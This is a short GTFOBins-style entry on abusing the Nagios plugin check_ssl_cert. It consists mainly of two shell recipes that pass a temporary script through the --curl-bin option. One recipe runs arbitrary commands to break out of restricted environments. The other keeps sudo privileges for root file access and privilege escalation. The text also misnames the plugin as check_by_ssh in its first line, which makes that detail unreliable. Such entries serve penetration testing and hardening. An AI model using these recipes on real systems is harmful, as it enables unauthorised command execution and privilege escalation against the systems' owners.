# GTFOBin: check_ssl_cert

This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

The host example.net must return a certificate via TLS

```
COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo "$COMMAND | tee $OUTPUT" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The host example.net must return a certificate via TLS

```
COMMAND=id
OUTPUT=output_file
TF=$(mktemp)
echo "$COMMAND | tee $OUTPUT" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT
```